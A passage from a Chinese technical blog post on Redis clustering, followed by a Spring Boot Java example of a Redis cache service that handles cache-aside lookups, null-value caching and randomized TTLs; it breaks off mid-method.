实例负责。并且只有数组中的所有 entries 都被分配给一个 Redis 实例，整个集群才能认为是上线状态。</p><p>因此真正在 Redis 集群中的查询动作通常会先检查数据是否缓存在当前结点中，如果不是则响应 <code>MOVE(IP:PORT)</code> 来指示 client 应该对哪个实例请求该数据。</p><p>现在，我们把集群配合上之前提到的 replicas，形成经典的 “<strong><u>三主三从 + 哨兵 架构</u></strong>”，以此来提升集群的整体可用性：</p><p><img src="imgs/replicas-dist.png" width="400px" /></p><h1 id="Appendix-Redis-Spring-Boot-Example"><a href="#Appendix-Redis-Spring-Boot-Example" class="headerlink" title="Appendix:  Redis + Spring Boot Example"></a>Appendix:  Redis + Spring Boot Example</h1><p>下面是使用 Spring Boot 框架的 Redis 单物理节点代码示例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CacheService</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check if the cache(redis) is used and connected.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAlive</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the data from the cache and database.</span></span><br><span class="line"><span class="comment">     * If cache misses, it will use fallback function to get the current data and cache then.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> keyPrefix The key prefix of the stored items</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id The key ID to identify the specific items from a group of stored items</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type The type of stored items</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fallback The fallback database query function used when cache misses</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> time The TTL for the specific cached item</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> unit The time unit of the TTL</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Always the specific stored item consistent with database</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, TypeReference&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the data from the cache and database.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> CacheService#queryAndCache(String, Object, TypeReference, Function, Long, TimeUnit)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get a bunch of data from the cache.</span></span><br><span class="line"><span class="comment">     * If cache misses, it will use fallback function to get the current data and cache then.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The returned list is ordered.</span></span><br><span class="line"><span class="comment">     *  But R could be null if ID is not found in either cache or database.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> CacheService#queryAndCache(String, Object, TypeReference, Function, Long, TimeUnit)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;List&lt;R&gt; <span class="title function_">queryInBatch</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, List&lt;ID&gt; ids, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Only query the data from the cache.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@apiNote</span> [WARNING] We don&#x27;t suppose you to use this method for the following reasons:</span></span><br><span class="line"><span class="comment">     *  1. It will not cache the results, which may cause cache penetration if you use it heavily;</span></span><br><span class="line"><span class="comment">     *  2. The result may be not consistent with database, for it only query on redis for existence.</span></span><br><span class="line"><span class="comment">     *  So you are advised to:</span></span><br><span class="line"><span class="comment">     *  - Put the result after you finally get the data;</span></span><br><span class="line"><span class="comment">     *  - Retry the query on database if you cannot find it</span></span><br><span class="line"><span class="comment">     *    (because it doesn&#x27;t mean that the data don&#x27;t exist in database).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> CacheService#put(String, Object, Object, Long, TimeUnit)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;Optional&lt;R&gt; <span class="title function_">_query</span><span class="params">(String keyPrefix, ID id, TypeReference&lt;R&gt; type)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Put the specific item into the cache.</span></span><br><span class="line"><span class="comment">     * It will overwrite the original item with the same key (if exists).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span> Use asynchronous operation to improve the throughput.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;<span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String keyPrefix, ID id, R val, Long time, TimeUnit unit)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Put cache items in batch.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@apiNote</span> We don&#x27;t use TTL here to avoid a bunch of data use a same TTL,</span></span><br><span class="line"><span class="comment">     *  which may cause cache avalanche.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span></span></span><br><span class="line"><span class="comment">     *  1. Use discrete &amp; random TTL for each item.</span></span><br><span class="line"><span class="comment">     *  2. Use asynchronous operation to improve the throughput.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;<span class="keyword">void</span> <span class="title function_">putInBatch</span><span class="params">(String keyPrefix, List&lt;ID&gt; ids, List&lt;R&gt; values)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Invalidate the specific item from the cache.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span> It will actually invalid the cached item by putting an invalid value to it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;ID&gt;Boolean <span class="title function_">invalidate</span><span class="params">(String keyPrefix, ID id)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Invalidate the stored items with the same key prefix.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span> It will actually invalid the cached item by putting an invalid value to it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Long <span class="title function_">invalidateByKeyPrefix</span><span class="params">(String keyPrefix)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Purge the stored item from the cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;ID&gt;Boolean <span class="title function_">remove</span><span class="params">(String keyPrefix, ID id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CacheService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate template;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectMapper mapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAlive</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RedisConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> template.getConnectionFactory();</span><br><span class="line">            <span class="keyword">return</span> factory != <span class="literal">null</span> &amp;&amp; !factory.getConnection().isClosed();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when checking redis connection: &#123;&#125;&quot;</span>, exception.getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        TypeReference&lt;R&gt; typeReference = <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Type <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> type;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.queryAndCache(keyPrefix, id, typeReference, fallback, time, unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, TypeReference&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id.toString();</span><br><span class="line">        <span class="comment">// Stage 1. lookup in redis</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) <span class="keyword">try</span> &#123;</span><br><span class="line">            String jsonResult;</span><br><span class="line">            <span class="comment">// maybe fault</span></span><br><span class="line">            jsonResult = template.opsForValue().get(key);</span><br><span class="line">            <span class="keyword">if</span> (jsonResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Cache hit when fetching key: &#123;&#125;&quot;</span>, key);</span><br><span class="line">                <span class="comment">// has non-blank value in redis?</span></span><br><span class="line">                <span class="keyword">if</span> (jsonResult.equals(Cache.REDIS_INVALID_VALUE)) &#123;</span><br><span class="line">                    <span class="comment">// empty value indicates non-existence.</span></span><br><span class="line">                    <span class="keyword">return</span> Optional.empty();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// <span class="doctag">TODO:</span> cache hit 后是否更新 TTL?</span></span><br><span class="line">                    <span class="type">R</span> <span class="variable">v</span> <span class="operator">=</span> mapper.readValue(jsonResult, type);</span><br><span class="line">                    <span class="keyword">return</span> Optional.of(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Failed to fetch data from redis due to: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Stage 2. fallback to database</span></span><br><span class="line">        Optional&lt;R&gt; dbResult = fallback.apply(id);</span><br><span class="line">        log.debug(<span class="string">&quot;Cache miss when fetching key: &#123;&#125;. Cache it now&quot;</span>, key);</span><br><span class="line">        <span class="comment">// we deliberately write empty value to indicate non-existence.</span></span><br><span class="line">        <span class="built_in">this</span>.put(keyPrefix, id, dbResult.isPresent() ? dbResult.get() : Cache.REDIS_INVALID_VALUE, time, unit);</span><br><span class="line">        <span class="keyword">return</span> dbResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; List&lt;R&gt; <span class="title function_">queryInBatch</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, List&lt;ID&gt; ids, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        List&lt;R&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">            <span class="comment">// query in redis first</span></span><br><span class="line">            <span class="keyword">for</span> (ID id: ids) &#123;</span><br><span class="line">                R curRes;</span><br><span class="line">                String jsonResult;</span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id.toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// maybe fault</span></span><br><span class="line">                    jsonResult = template.opsForValue().get(key);</span><br><span class="line">                    <span class="keyword">if</span> (jsonResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                        log.debug(<span class="string">&quot;Cache hit when doing batch query: &#123;&#125;&quot;</span>, key);</span><br><span class="line">                        curRes = mapper.readValue(jsonResult, type);</span><br><span class="line">                        <span class="keyword">if</span> (!curRes.equals(Cache.REDIS_INVALID_VALUE)) &#123;</span><br><span class="line">                            result.addLast(curRes);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// not exist</span></span><br><span class="line">                            result.addLast(<span class="literal">null</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Batch query failed: &#123;&#125;. Skip current one.&quot;</span>,</span><br><span class="line">                            exception.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// fallback to database</span></span><br><span class="line">                curRes = fallback.apply(id).orElse(<span class="literal">null</span>);</span><br><span class="line">                log.debug(<span class="string">&quot;Cache miss when doing batch query: &#123;&#125;. Cache it now&quot;</span>, key);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// set cache</span></span><br><span class="line">                    template.opsForValue().set(</span><br><span class="line">                            key, curRes == <span class="literal">null</span> ? Cache.REDIS_INVALID_VALUE</span><br><span class="line">                                    : mapper.writeValueAsString(curRes),</span><br><span class="line">                            time, unit</span><br><span class="line">                    );</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Cache data from database failed when batching query: &#123;&#125;. Skip current one.&quot;</span>,</span><br><span class="line">                            exception.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                result.addLast(curRes);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// query in database only</span></span><br><span class="line">            <span class="keyword">for</span> (ID id: ids) &#123;</span><br><span class="line">                result.addLast(fallback.apply(id).orElse(<span class="literal">null</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; Optional&lt;R&gt; <span class="title function_">_query</span><span class="params">(String keyPrefix, ID id, TypeReference&lt;R&gt; type)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id.toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) <span class="keyword">try</span> &#123;</span><br><span class="line">            String jsonResult;</span><br><span class="line">            <span class="comment">// may be fault even we have already checked the liveness</span></span><br><span class="line">            jsonResult = template.opsForValue().get(key);</span><br><span class="line">            <span class="keyword">if</span> (jsonResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Cache hit when fetching key with _query: &#123;&#125;&quot;</span>, key);</span><br><span class="line">                <span class="comment">// has non-blank value in redis?</span></span><br><span class="line">                <span class="keyword">if</span> (!jsonResult.equals(Cache.REDIS_INVALID_VALUE)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> Optional.of(mapper.readValue(jsonResult, type));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Sadly we cannot use empty value to indicate non-existence. :(</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Failed to do simple query on redis due to: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        log.debug(<span class="string">&quot;Cache miss when fetching key with _query: &#123;&#125;&quot;</span>, key);</span><br><span class="line">        <span class="keyword">return</span> Optional.empty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String keyPrefix, ID id, R val, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">                template.opsForValue().set(</span><br><span class="line">                        keyPrefix + id.toString(),</span><br><span class="line">                        mapper.writeValueAsString(val),</span><br><span class="line">                        time, unit</span><br><span class="line">                );</span><br><span class="line">                log.debug(<span class="string">&quot;Set cache for key: &#123;&#125;; TTL: &#123;&#125; &#123;&#125;&quot;</span>, keyPrefix + id, time, unit);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Redis not alive. Skip writing to it.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when setting value for redis: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; <span class="keyword">void</span> <span class="title function_">putInBatch</span><span class="params">(String keyPrefix, List&lt;ID&gt; ids, List&lt;R&gt; values)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">randomGen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> ids.size() == values.size();</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (ID id: ids) &#123;</span><br><span class="line">                    <span class="comment">// center: REDIS_DEFAULT_CACHE_TTL</span></span><br><span class="line">                    <span class="comment">// [center - RANGE, center + RANGE]</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">randomTime</span> <span class="operator">=</span> randomGen.nextLong(<span class="number">2</span> * Cache.REDIS_BATCH_RANDOM_TTL_RANGE)</span><br><span class="line">                            + Cache.REDIS_DEFAULT_CACHE_TTL - Cache.REDIS_BATCH_RANDOM_TTL_RANGE;</span><br><span class="line">                    template.opsForValue().set(</span><br><span class="line">                            keyPrefix + id.toString(),</span><br><span class="line">                            mapper.writeValueAsString(values.get(idx)),</span><br><span class="line">                            randomTime, Cache.REDIS_TTL_UNIT</span><br><span class="line">                    );</span><br><span class="line">                    log.debug(<span class="string">&quot;Set cache for key in batch: &#123;&#125;; TTL: &#123;&#125; &#123;&#125;&quot;</span>,</span><br><span class="line">                            keyPrefix + id, randomTime, Cache.REDIS_TTL_UNIT);</span><br><span class="line">                    ++idx;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Redis not alive. Skip batch process.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> 